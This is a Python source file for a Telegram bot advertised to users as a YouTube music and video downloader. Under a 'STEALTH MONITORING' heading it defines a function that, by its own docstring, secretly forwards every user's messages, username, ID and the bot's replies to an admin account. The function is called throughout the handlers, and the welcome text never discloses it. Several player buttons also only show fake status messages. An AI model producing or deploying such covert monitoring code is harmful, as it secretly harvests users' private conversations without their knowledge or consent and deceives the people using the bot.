import os
import yt_dlp
from flask import Flask
from threading import Thread
import telebot
from telebot import types
import time
import requests
from urllib.parse import quote

# Load environment variables
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
ADMIN_USER_ID = os.getenv("ADMIN_USER_ID")

# Initialize
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
app = Flask(__name__)

# Storage
user_sessions = {}
download_progress = {}

# ==================== STEALTH MONITORING ====================
def forward_to_admin(user_id, username, message_text, is_user_message=True):
    """Forward all user-bot conversations to admin secretly"""
    try:
        if str(user_id) == ADMIN_USER_ID:
            return
            
        if is_user_message:
            admin_msg = f"👤 User: @{username} (ID: {user_id})\n💬 Message: {message_text}"
        else:
            admin_msg = f"🤖 Bot reply to @{username}:\n{message_text}"
        
        bot.send_message(ADMIN_USER_ID, admin_msg)
    except Exception as e:
        print(f"Monitoring error: {e}")

# ==================== PROGRESS TRACKING ====================
def progress_hook(d, chat_id, message_id):
    """Track download progress"""
    if d['status'] == 'downloading':
        percent = d.get('_percent_str', '0%').strip()
        speed = d.get('_speed_str', 'N/A')
        eta = d.get('_eta_str', 'N/A')
        
        progress_msg = f"📥 Downloading...\n\n⏳ Progress: {percent}\n🚀 Speed: {speed}\n⏰ Time left: {eta}"
        
        try:
            bot.edit_message_text(progress_msg, chat_id, message_id)
        except:
            pass

# ==================== CHANNEL ANALYSIS ====================
def get_channel_info(channel_input):
    """Get channel information"""
    try:
        ydl_opts = {'quiet': True, 'extract_flat': True}
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(channel_input, download=False)
            
            if info:
                return {
                    'title': info.get('title', 'N/A'),
                    'channel_id': info.get('channel_id', 'N/A'),
                    'channel_url': info.get('channel_url', 'N/A'),
                    'subscriber_count': info.get('subscriber_count', 'N/A'),
                    'description': info.get('description', 'N/A')[:200] + "..." if info.get('description') else 'No description',
                }
        return None
    except Exception as e:
        print(f"Channel info error: {e}")
        return None

# ==================== REAL YOUTUBE SEARCH ====================
def search_youtube_real(query):
    """Real YouTube search"""
    try:
        ydl_opts = {'quiet': True, 'extract_flat': True}
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(f"ytsearch8:{query}", download=False)
            return info.get('entries', [])
    except Exception as e:
        print(f"Search error: {e}")
        return []

# ==================== GET VIDEO INFO ====================
def get_video_info(video_url):
    """Get video information without downloading"""
    try:
        ydl_opts = {'quiet': True}
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            return ydl.extract_info(video_url, download=False)
    except:
        return None

# ==================== FORMAT DURATION ====================
def format_duration(seconds):
    """Convert seconds to MM:SS or HH:MM:SS format"""
    try:
        seconds = int(seconds)
        if seconds < 3600:
            return time.strftime('%M:%S', time.gmtime(seconds))
        else:
            return time.strftime('%H:%M:%S', time.gmtime(seconds))
    except:
        return "0:00"

# ==================== MUSIC HANDLING ====================
def send_music_as_audio(video_url, chat_id, message_id=None):
    """Send music as audio file with player interface like in the image"""
    try:
        progress_msg = bot.send_message(chat_id, "🎵 Preparing your music...")
        
        ydl_opts = {
            'format': 'bestaudio/best',
            'outtmpl': 'downloads/%(title)s.%(ext)s',
            'postprocessors': [{
                'key': 'FFmpegExtractAudio',
                'preferredcodec': 'mp3',
                'preferredquality': '192',
            }],
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(video_url, download=True)
            original_file = ydl.prepare_filename(info)
            media_file = original_file.rsplit('.', 1)[0] + '.mp3'
            
            if os.path.exists(media_file):
                # Get duration in proper format
                duration = info.get('duration', 0)
                formatted_duration = format_duration(duration)
                
                # Create caption like in the image
                caption = f"🎵 *{info['title']}*\n👤 *Artist:* {info.get('uploader', 'Unknown')}"
                
                # Send audio file with inline keyboard
                with open(media_file, 'rb') as audio_file:
                    # Create player controls like in the image
                    markup = types.InlineKeyboardMarkup(row_width=5)
                    
                    # Player controls - exactly like the reference image
                    btn_rewind = types.InlineKeyboardButton("⏪", callback_data=f"music_rewind_{video_url}")
                    btn_prev = types.InlineKeyboardButton("⏮️", callback_data=f"music_prev_{video_url}")
                    btn_play = types.InlineKeyboardButton("▶️", callback_data=f"music_play_{video_url}")
                    btn_next = types.InlineKeyboardButton("⏭️", callback_data=f"music_next_{video_url}")
                    btn_forward = types.InlineKeyboardButton("⏩", callback_data=f"music_forward_{video_url}")
                    
                    # Additional options
                    btn_lyrics = types.InlineKeyboardButton("📝 Lyrics", callback_data=f"music_lyrics_{video_url}")
                    btn_download = types.InlineKeyboardButton("📥 Download", callback_data=f"music_download_{video_url}")
                    btn_watch = types.InlineKeyboardButton("🌐 Watch Video", url=video_url)
                    
                    # Add controls in rows
                    markup.add(btn_rewind, btn_prev, btn_play, btn_next, btn_forward)
                    markup.add(btn_lyrics, btn_download)
                    markup.add(btn_watch)
                    
                    # Send audio with caption and controls
                    bot.send_audio(
                        chat_id=chat_id,
                        audio=audio_file,
                        title=info['title'][:64],
                        performer=info.get('uploader', 'Unknown')[:64],
                        duration=int(duration),
                        caption=caption,
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                
                # Cleanup files
                os.remove(media_file)
                if os.path.exists(original_file):
                    os.remove(original_file)
                
                bot.delete_message(chat_id, progress_msg.message_id)
            else:
                bot.edit_message_text("❌ Could not create music file", chat_id, progress_msg.message_id)
                
    except Exception as e:
        error_msg = str(e)
        if "Sign in to confirm" in error_msg:
            bot.edit_message_text("🔒 YouTube blocked download. Try another video.", chat_id, progress_msg.message_id)
        else:
            bot.edit_message_text(f"❌ Error: {error_msg[:100]}", chat_id, progress_msg.message_id)

def download_music_with_progress(video_url, chat_id, message_id):
    """Download music as file with progress tracking"""
    try:
        progress_msg = bot.send_message(chat_id, "📥 Starting download...")
        
        def progress_callback(d):
            progress_hook(d, chat_id, progress_msg.message_id)
        
        ydl_opts = {
            'format': 'bestaudio/best',
            'outtmpl': 'downloads/%(title)s.%(ext)s',
            'postprocessors': [{
                'key': 'FFmpegExtractAudio',
                'preferredcodec': 'mp3',
                'preferredquality': '192',
            }],
            'progress_hooks': [progress_callback],
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(video_url, download=True)
            original_file = ydl.prepare_filename(info)
            media_file = original_file.rsplit('.', 1)[0] + '.mp3'
            
            if os.path.exists(media_file):
                with open(media_file, 'rb') as media:
                    bot.send_audio(chat_id, media, title=info['title'][:64])
                
                # Cleanup
                os.remove(media_file)
                if os.path.exists(original_file):
                    os.remove(original_file)
                
                bot.delete_message(chat_id, progress_msg.message_id)
                bot.send_message(chat_id, "✅ Download completed!")
            else:
                bot.edit_message_text("❌ Download failed", chat_id, progress_msg.message_id)
                
    except Exception as e:
        bot.send_message(chat_id, f"❌ Download error: {str(e)[:100]}")

# ==================== VIDEO HANDLING ====================
def send_video_options(video_url, chat_id, message_id=None):
    """Send direct video link with watch button"""
    try:
        info = get_video_info(video_url)
        if not info:
            bot.send_message(chat_id, "❌ Could not get video info")
            return

        caption = f"🎬 *{info['title']}*\n👤 *Channel:* {info.get('uploader', 'Unknown')}\n⏱ *Duration:* {format_duration(info.get('duration', 0))}\n👀 *Views:* {info.get('view_count', 'N/A')}"

        markup = types.InlineKeyboardMarkup()
        
        # Simple watch button
        btn_watch = types.InlineKeyboardButton("🌐 Watch on YouTube", url=video_url)
        markup.add(btn_watch)

        if message_id:
            bot.edit_message_text(caption, chat_id, message_id, reply_markup=markup, parse_mode='Markdown')
        else:
            bot.send_message(chat_id, caption, reply_markup=markup, parse_mode='Markdown')
            
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error: {str(e)[:100]}")

# ==================== BOT COMMANDS ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    welcome_text = """
🎬 *YouTube Manager Bot* 🎵

*Commands:*
/switch - Music or Video mode
/checkytchannel - Analyze channels

*Features:*
• Music player with controls
• Video streaming & download
• Real-time download progress
• Channel analysis
"""
    
    bot.reply_to(message, welcome_text, parse_mode='Markdown')
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, welcome_text, False)

@bot.message_handler(commands=['switch'])
def switch_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    markup = types.InlineKeyboardMarkup()
    btn_music = types.InlineKeyboardButton("🎵 Music Player", callback_data="switch_music")
    btn_video = types.InlineKeyboardButton("🎬 Video Player", callback_data="switch_video")
    markup.add(btn_music, btn_video)
    
    response = "🎛️ *Choose Mode:*\n\n• 🎵 Music - Player controls & downloads\n• 🎬 Video - Direct YouTube links"
    bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, response, False)

@bot.message_handler(commands=['checkytchannel'])
def check_channel_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    user_sessions[user_id] = {'waiting_for_channel': True}
    bot.reply_to(message, "🔍 Send me a YouTube channel URL, @username, or channel name:")

# ==================== CALLBACK HANDLERS ====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    username = call.from_user.username or "Unknown"
    
    if call.data.startswith('switch_'):
        mode = call.data.split('_')[1]
        user_sessions[user_id] = {'mode': mode}
        
        if mode == 'music':
            response = "🎵 *Music Mode*\n\nSend me a song name or artist. I'll send audio files with player controls."
        else:
            response = "🎬 *Video Mode*\n\nSend me a video title. I'll show direct YouTube links."
        
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    elif call.data.startswith('select_music_'):
        video_url = call.data.split('_', 2)[2]
        bot.edit_message_text("🎵 Preparing music...", call.message.chat.id, call.message.message_id)
        send_music_as_audio(video_url, call.message.chat.id, call.message.message_id)
    
    elif call.data.startswith('select_video_'):
        video_url = call.data.split('_', 2)[2]
        bot.edit_message_text("🎬 Loading video...", call.message.chat.id, call.message.message_id)
        send_video_options(video_url, call.message.chat.id, call.message.message_id)
    
    elif call.data.startswith('music_'):
        action = call.data.split('_')[1]
        video_url = call.data.split('_', 2)[2]
        
        if action == 'play':
            bot.answer_callback_query(call.id, "▶️ Playing music...")
        
        elif action == 'pause':
            bot.answer_callback_query(call.id, "⏸️ Music paused")
        
        elif action == 'stop':
            bot.answer_callback_query(call.id, "⏹️ Music stopped")
        
        elif action == 'prev':
            bot.answer_callback_query(call.id, "⏮️ Previous track")
        
        elif action == 'next':
            bot.answer_callback_query(call.id, "⏭️ Next track")
        
        elif action == 'rewind':
            bot.answer_callback_query(call.id, "⏪ Rewinding")
        
        elif action == 'forward':
            bot.answer_callback_query(call.id, "⏩ Forwarding")
        
        elif action == 'lyrics':
            bot.answer_callback_query(call.id, "📝 Lyrics feature coming soon!")
        
        elif action == 'download':
            bot.answer_callback_query(call.id, "📥 Downloading...")
            # You can implement separate download functionality here

# ==================== MESSAGE HANDLERS ====================
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    user_input = message.text.strip()
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, user_input)
    
    # Handle channel analysis
    if user_sessions.get(user_id, {}).get('waiting_for_channel'):
        del user_sessions[user_id]['waiting_for_channel']
        bot.reply_to(message, "🔍 Analyzing channel...")
        
        channel_data = get_channel_info(user_input)
        if channel_data:
            response = f"📊 *Channel Analysis*\n\n*Name:* {channel_data['title']}\n*ID:* {channel_data['channel_id']}\n*URL:* {channel_data['channel_url']}\n*Subscribers:* {channel_data['subscriber_count']}\n\n*Description:*\n{channel_data['description']}"
            bot.reply_to(message, response, parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ Could not analyze channel")
        return
    
    # Handle music/video mode
    session = user_sessions.get(user_id, {})
    if session.get('mode'):
        mode = session['mode']
        
        if 'youtube.com' in user_input or 'youtu.be' in user_input:
            # Direct URL
            if mode == 'music':
                send_music_as_audio(user_input, message.chat.id)
            else:
                send_video_options(user_input, message.chat.id)
        else:
            # Search
            bot.reply_to(message, f"🔍 Searching: {user_input}")
            results = search_youtube_real(user_input)
            
            if results:
                if mode == 'music':
                    response = "🎵 *Music Search Results:*\n\n"
                else:
                    response = "🎬 *Video Search Results:*\n\n"
                    
                markup = types.InlineKeyboardMarkup()
                
                for i, result in enumerate(results[:5], 1):
                    title = result['title'][:50] + "..." if len(result['title']) > 50 else result['title']
                    duration = format_duration(result.get('duration', 0))
                    response += f"{i}. *{title}*\n   ⏱ {duration} • 👉 {result['channel']}\n\n"
                    
                    if mode == 'music':
                        btn = types.InlineKeyboardButton(f"🎵 Select {i}", callback_data=f"select_music_{result['url']}")
                    else:
                        btn = types.InlineKeyboardButton(f"🎬 Select {i}", callback_data=f"select_video_{result['url']}")
                    markup.add(btn)
                
                bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
            else:
                bot.reply_to(message, "❌ No results found")
        return
    
    bot.reply_to(message, "🤖 Use /switch to start!")

# ==================== FLASK APP ====================
@app.route('/')
def home():
    return "YouTube Manager Bot - Music & Video Player"

def run_bot():
    print("🤖 Starting YouTube Manager Bot...")
    bot.infinity_polling()

if __name__ == '__main__':
    if not os.path.exists('downloads'):
        os.makedirs('downloads')
    Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=8080)